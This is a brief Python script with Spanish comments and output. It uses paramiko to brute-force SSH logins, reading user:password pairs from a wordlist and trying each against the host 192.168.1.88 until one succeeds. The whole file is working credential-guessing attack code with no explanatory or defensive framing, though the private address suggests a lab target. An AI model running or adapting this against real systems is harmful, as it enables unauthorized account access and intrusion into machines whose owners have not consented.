#!/usr/bin/python3.8

import paramiko
import sys

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

diccionario = open(sys.argv[1], 'r')

for linea in diccionario.readlines():
 credencial = linea.strip().split(':')
 try:
     ssh.connect('192.168.1.88', username=credencial[0], password=credencial[1])
 except paramiko.AuthenticationException:
     print("Usario:", credencial[0], "y password: ", credencial[1], "Incorrecto!!")
 else:
     print("\n=====================================================")
     print("Usuario y password correcto!!!", credencial[0], credencial[1], "     ||")
     print("=====================================================")
     exit(0)

ssh.close()
